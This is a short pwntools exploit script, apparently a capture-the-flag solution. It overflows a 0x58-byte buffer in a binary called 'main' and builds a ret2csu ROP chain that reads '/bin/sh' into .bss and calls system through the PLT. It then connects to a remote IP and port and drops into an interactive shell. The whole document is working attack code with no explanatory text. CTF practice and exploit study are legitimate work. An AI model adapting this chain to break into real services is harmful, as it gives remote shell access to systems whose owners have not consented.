from pwn import*
p = process('./main')
elf =ELF('./main')
p = remote('39.101.210.214',10010)
m_gadget = 0x401332
n_gadget = 0x401318
pop_rdi_ret = 0x40133B
elf =ELF('./main')
payload  = '\x00'*0x58
payload += p64(m_gadget) + p64(0) + p64(1) + p64(0) + p64(elf.bss() + 0x50) + p64(0x8) + p64(elf.got['read'])
payload += p64(n_gadget) + '\x00'*8*7 + p64(pop_rdi_ret) + p64(elf.bss() + 0x50) + p64(elf.plt['system'])
p.sendlineafter('Time!',payload)
p.sendline('/bin/sh')
p.interactive()
